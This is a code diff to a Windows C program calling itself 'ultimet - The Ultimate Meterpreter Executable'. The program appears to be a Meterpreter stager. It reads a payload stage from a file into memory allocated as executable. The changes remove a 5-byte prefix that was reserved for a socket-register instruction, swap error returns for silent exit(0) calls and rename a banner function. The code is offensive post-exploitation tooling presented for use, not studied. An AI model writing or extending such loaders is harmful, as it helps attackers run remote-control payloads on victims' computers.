@@ -11,7 +11,7 @@ LONGLONG SizeFromName(LPCWSTR szFileName) // Returns a file's size from its file
 		err = GetLastError();
 		dprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
 		CloseHandle(hfile);
-		return -1;
+		exit(0);
 	}
 
 	if(!GetFileSizeEx(hfile,&fileSize)) // Get the size from the file handle
@@ -19,7 +19,7 @@ LONGLONG SizeFromName(LPCWSTR szFileName) // Returns a file's size from its file
 		err = GetLastError();
 		dprintf(L"[-] Error getting file size! GetFileSizeEx() returned : %08x\n", err);
 		CloseHandle(hfile);
-		return -1;
+		exit(0);
 	}
 
 	CloseHandle(hfile); // this will ALWAYS throw an exception if run under a debugger, but good higene if run under "production"
@@ -41,15 +41,15 @@ DWORD CopyStageToBuffer(LPCWSTR szFileName, unsigned char** buffer)
 	}
 
 	// Allocate memory ...
-	dprintf(L"[*] Trying to VirtualAlloc \"%d + 5\" bytes of data\n", size);
-	*buffer = (unsigned char*)VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	dprintf(L"[*] Trying to VirtualAlloc \"%d\" bytes of data\n", size);
+	*buffer = (unsigned char*)VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (buffer == NULL)
 	{
 		err = GetLastError();
 		dprintf(L"[-] Failed to allocate memory! VirtualAlloc() returned : %08x\n", err);
 		return -1;
 	}
-	dprintf(L"[*] Success! \"%d + 5\" bytes allocated.\n", size);
+	dprintf(L"[*] Success! \"%d\" bytes allocated.\n", size);
 
 	// Reading file content into buffer.
 	//... first we get a handle on the file
@@ -59,18 +59,18 @@ DWORD CopyStageToBuffer(LPCWSTR szFileName, unsigned char** buffer)
 		err = GetLastError();
 		dprintf(L"[-] Invalid file handle! CreateFile() returned : %08x\n", err);
 		CloseHandle(hfile);
-		return -1;
+		exit(0);
 	}
 	
-	dprintf(L"[*] Copying file \"%s\" to buffer after skipping 5 bytes...\n", szFileName);
-	if( FALSE == ReadFile(hfile, *buffer + 5, (DWORD)size, NULL, NULL) )
+	dprintf(L"[*] Copying file \"%s\" to buffer...\n", szFileName);
+	if( FALSE == ReadFile(hfile, *buffer, (DWORD)size, NULL, NULL) )
 	{
 		printf("[-] Unable to read from file.\n");
 		CloseHandle(hfile);
-		return -1;
+		exit(0);
 	}
 	// We add 5 bytes to leave room for 0xBF+SOCKET_NUMBER
-	return ((DWORD)size + 5); 
+	return (DWORD)size; 
 }
 
 int PatchString(unsigned char* buffer, const wchar_t* replacement, const int index, const int NoOfBytes)
@@ -121,7 +121,7 @@ bool UnicodeToAnsi(char* ascii, const wchar_t* unicode)
 	return TRUE;
 }
 
-void print_awesome_header()
+void print_header()
 {
 printf("\n\n****************************************************\n");
 printf(" [+] [ultimet] - The Ultimate Meterpreter Executable\n");
